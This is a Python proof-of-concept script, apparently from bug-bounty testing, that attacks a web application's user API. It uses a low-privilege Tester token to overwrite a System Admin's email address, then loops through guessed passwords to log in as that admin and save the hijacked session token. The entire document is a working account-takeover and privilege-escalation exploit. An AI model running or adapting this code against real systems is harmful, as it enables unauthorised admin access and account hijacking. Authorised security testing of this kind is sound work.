import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TT=open('/tmp/tok_Tester').read().strip()
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or TT),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
def login(email,pw):
    cmd=['curl','-s','-m','30','-o','/tmp/l','-w','%{http_code}','-X','POST',H+'/api/v1/users/login',
         '-H',BB,'-H','Content-Type: application/json','-d',json.dumps({"credentials":{"email":email,"password":pw}})]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/l',encoding='utf-8',errors='replace').read()
def user(uid):
    c,b=req('GET',f'/api/v1/users/{uid}')
    try: return json.loads(b)['users'][0]
    except: return {}
# Target: System Admin 53 (role 2) — HIGHER than Tester(4)
UID=53
u=user(UID)
print(f"=== target {UID}: {u.get('email')} role={u.get('role_id')} (System Admin) ===")
NEW=f"zx-sysadm-{uuid.uuid4().hex[:8]}@bugcrowdninja.com"
print(f"\nSTEP 1: Tester(role 4) overwrites System Admin's email -> {NEW}")
c,b=req('PUT',f'/api/v1/users/{UID}',{"user":{"email":NEW}})
print(f"  PUT -> {c}")
now=user(UID).get('email')
print(f"  read-back -> {now!r}  {'*** LANDED ***' if now==NEW else 'FAILED'}")
print(f"\nSTEP 2: log in as the System Admin using the hijacked address")
for pw in ["TesterZx2026!","Zx9!chain47","Tester"]:
    c,b=login(NEW,pw)
    print(f"  pw={pw:16} -> {c}")
    if c=='200':
        s=json.loads(b)['session']
        print(f"  *** TAKEOVER: id={s['id']} role={s['role_id']} email={s['email']} ***")
        open('/tmp/tok_sysadm_hijacked','w').write(s['token'])
        break
print(f"\nSTEP 3: old address dead?")
c,b=login(u.get('email'),"TesterZx2026!")
print(f"  old addr login -> {c}")
